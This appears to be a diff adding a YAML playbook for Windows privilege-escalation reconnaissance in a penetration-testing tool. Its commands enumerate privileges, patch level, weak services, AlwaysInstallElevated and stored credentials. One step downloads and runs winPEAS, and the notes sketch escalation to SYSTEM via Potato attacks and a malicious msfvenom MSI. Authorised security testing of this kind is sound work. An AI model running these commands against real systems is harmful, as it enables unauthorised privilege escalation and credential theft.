@@ -1,0 +1,68 @@
+id: windows-priv-esc-recon
+name: "Windows PE — recon (winpeas/seatbelt/whoami)"
+description: >
+  Standard Windows local-priv-esc enumeration. Tells you which of the
+  classic escalation paths is open (token impersonation, service
+  abuse, AlwaysInstallElevated, stored creds, scheduled tasks).
+tags: [windows, priv-esc, recon, post-exploitation]
+difficulty: easy
+
+inputs: []
+
+steps:
+  - id: whoami_priv
+    name: "Show privileges & groups"
+    inline_command: "whoami /all"
+    notes: |
+      SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege → Potato
+      attack to SYSTEM. SeBackup / SeRestore → registry-hive dump.
+      SeDebug → process memory access.
+    capture:
+      - var: privs_enabled
+        regex: '^(Se\w+)\s+\S+\s+(Enabled|Disabled)$'
+        match: all
+        groups: { name: 1, state: 2 }
+
+  - id: systeminfo
+    name: "Patch level & arch"
+    inline_command: "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\" /C:\"Hotfix(s)\""
+    notes: |
+      Compare missing hotfixes against Sherlock/Watson DB. Old patch level
+      + x64 + no AV = kernel exploit candidate.
+
+  - id: services
+    name: "Vulnerable service config (unquoted/weakperm)"
+    inline_command: "wmic service get name,pathname,startname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\\\windows\\\\\""
+    notes: |
+      Look for paths with spaces and no quotes → unquoted-service-path.
+      Then check `icacls <path>` for `(F)` (full) or `(M)` (modify) on
+      Authenticated Users / Users.
+
+  - id: alwaysinstallelevated
+    name: "AlwaysInstallElevated check"
+    inline_command: |
+      reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+      reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+    notes: |
+      Both = 0x1 → craft an msi with msfvenom and `msiexec /quiet /i x.msi`
+      to spawn SYSTEM.
+
+  - id: stored_creds
+    name: "Stored credentials"
+    inline_command: "cmdkey /list; dir /s C:\\Users\\*unattend* C:\\Users\\*sysprep* 2>nul"
+    notes: |
+      cmdkey targets → `runas /savecred /user:<...> cmd.exe`. Unattend.xml
+      often has cleartext local admin password (legacy deployments).
+
+  - id: winpeas
+    name: "winpeas (full sweep — read the RED items)"
+    inline_command: "powershell -c \"iwr https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe -OutFile winpeas.exe; .\\winpeas.exe\""
+    notes: |
+      Heavy but the RED tags are gold: AlwaysInstallElevated, Always Install,
+      missing patches, exploitable services, AutoLogon registry, etc.
+
+references:
+  - title: "HackTricks — Windows PE"
+    url:   "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html"
+  - title: "PEASS-ng"
+    url:   "https://github.com/peass-ng/PEASS-ng"
